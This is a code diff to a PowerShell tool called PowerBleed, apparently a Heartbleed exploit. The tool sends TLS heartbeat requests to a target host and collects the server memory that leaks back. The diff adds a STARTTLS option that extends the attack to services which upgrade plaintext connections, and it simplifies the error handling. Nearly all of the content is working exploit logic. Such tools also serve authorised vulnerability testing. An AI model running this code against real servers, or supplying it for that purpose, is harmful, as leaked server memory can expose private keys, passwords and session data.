@@ -41,6 +41,11 @@ The TCP timeout for a connect request.  Also this is the
 read bytes timeout during the response reading.  This will
 timeout if the server does not support the TLS heartbeat function.
 
+.PARAMETER STARTTLS
+
+A boolean parameter that if true will send the plaintext "STARTTLS"
+command before sending the TLS client hello.
+
 #>
 
 function PowerBleed {
@@ -52,7 +57,8 @@ function PowerBleed {
         [Parameter(HelpMessage="Number of heartbeats to send")][int]$TLSTries=3,
         [Parameter(HelpMessage="Number of heartbeats to send")][int]$Heartbeats=3,
         [Parameter(HelpMessage="TCP and read connection timeout")][int]$Timeout=1000,
-        [Parameter(HelpMessage="Whether to randomly delay between heartbeats")][switch]$NoRandomDelay=$false
+        [Parameter(HelpMessage="Whether to randomly delay between heartbeats")][switch]$NoRandomDelay=$false,
+        [Parameter(HelpMessage="Enable to send the plaintext STARTTLS command.")][switch]$STARTTLS=$false
     )
 
     $tls_clienthello = [Byte[]] (
@@ -86,6 +92,7 @@ function PowerBleed {
 
     $IP = [System.Net.Dns]::GetHostByName($Hostname).AddressList[0].IPAddressToString
     $offset = 0
+    $temp = New-Object Byte[] 16384
     $buf = New-Object Byte[] 8388608
     for ($nt = 0; $nt -lt $TLSTries; $nt++) {
         $msg = "[*] Connection attempt number: {0}" -f ($nt + 1)
@@ -98,23 +105,25 @@ function PowerBleed {
                 Throw [System.Exception] "TCP Connection Timeout Exceeded"
             }
             $tcp.EndConnect($conn)
-            Try {
-                $stream = $tcp.GetStream()
-            }
-            Catch {
-                Throw
-            }
-    
-            # send TLS client hello
-            Try {
-                $stream.Write($tls_clienthello,0,$tls_clienthello.Length)
-            }
-            Catch {
-                Throw
+            $stream = $tcp.GetStream()
+
+            # send starttls if we need to
+            if ($STARTTLS) {
+                # any bytes waiting?  read them...
+                $awh = $stream.BeginRead($temp,0,$temp.Length,$null,$null)
+                $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
+                $n = $stream.EndRead($awh)
+
+                # send the STARTTLS command
+                $st = [System.Text.Encoding]::UTF8.GetBytes("STARTTLS`r`n`r`n")
+                $stream.Write($st,0,$st.Length)
+                $n = $stream.Read($temp,0,$temp.length)
             }
 
+            # send TLS client hello
+            $stream.Write($tls_clienthello,0,$tls_clienthello.Length)
+
             # get TLS server hello
-            $temp = New-Object Byte[] 16384
             $n = $stream.Read($temp,0,$temp.length)
             if ( $temp[0] -ne 0x16) {
                 Throw [System.Exception] "Malformed TLS Server Hello"
@@ -122,27 +131,19 @@ function PowerBleed {
 
             Write-Host "    [*] Sending $Heartbeats TLS heartbeat packets"
             for ($i=0; $i -lt $Heartbeats; $i++) {
-                Try {
-                    $stream.Write($heartbeat,0,$heartbeat.Length)
-                    Write-Host -NoNewline "        [+] "
-                    Write-Host -NoNewline "<3"
+                $stream.Write($heartbeat,0,$heartbeat.Length)
+                Write-Host -NoNewline "        [+] "
+                Write-Host -NoNewline "<3"
+
+                $awh = $stream.BeginRead($buf,$offset,$buf.length-$offset,$null,$null)
+                $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
+                if(!$wait) {
+                    Write-Host "`n`n"
+                    Throw [System.Exception] "No Response to TLS HeartBeat() request.  Host is not vulnerable!"
                 }
-                Catch {
-                    Throw
-                }
-                Try {
-                    $awh = $stream.BeginRead($buf,$offset,$buf.length-$offset,$null,$null)
-                    $wait = $awh.AsyncWaitHandle.WaitOne($Timeout,$false)
-                    if(!$wait) {
-                        Write-Host "`n`n"
-                        Throw [System.Exception] "No Response to TLS HeartBeat() request.  Host is not vulnerable!"
-                    }
-                    $n = $stream.EndRead($awh)
-                    $offset += $n
-                }
-                Catch {
-                    Throw
-                }
+                $n = $stream.EndRead($awh)
+                $offset += $n
+
                 $msg = ": {0,5} bytes returned from server. ({1} total bytes)" -f $n,$offset
                 Write-Host $msg
                 if (!$NoRandomDelay) {
